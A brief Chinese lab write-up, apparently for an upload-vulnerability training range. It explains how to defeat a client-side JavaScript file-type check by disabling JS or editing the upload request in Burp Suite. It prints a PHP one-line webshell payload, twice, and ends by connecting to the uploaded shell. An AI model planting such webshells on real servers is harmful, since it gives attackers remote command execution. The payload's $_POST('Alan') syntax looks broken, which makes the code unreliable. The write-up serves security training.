## 解题wp   (By:独立团孙德胜Alan)

本Pass是客户端过滤，可以通过禁用JS的方式绕过！

#### 1.打开第一关

![](.\img\1.png)

#### 2.上传一个普通的shell.php文件

```php
<?php @eval($_POST('Alan'));?>
```

![](.\img\2.png)

#### 提示不允许上传

![](.\img\3.png)

#### 3.分析代码

![](.\img\4.jpg)

#### 前端JS校验

#### 4.对于前端js验证的绕过方法较为简单，我们可以将要上传的php文件改后缀名为jpg|png|gif,绕过js验证后，再用burp更改上传请求。或者浏览器禁用js后进行上传。

![](.\img\4.png)

![](.\img\5.png)

#### 5.使用工具Burpsutie拦截，修改后缀名为.php

#### 修改图片内容为一句话木马的内容：

```
<?php @eval($_POST('Alan'));?>
```

![](.\img\6.png)

#### 使用重放包功能上传Alan.php：

![](.\img\7.png)

![](.\img\8.png)

#### 6.上传成功！

![](.\img\9.png)

#### 7.使用webshell连接工具连接即可。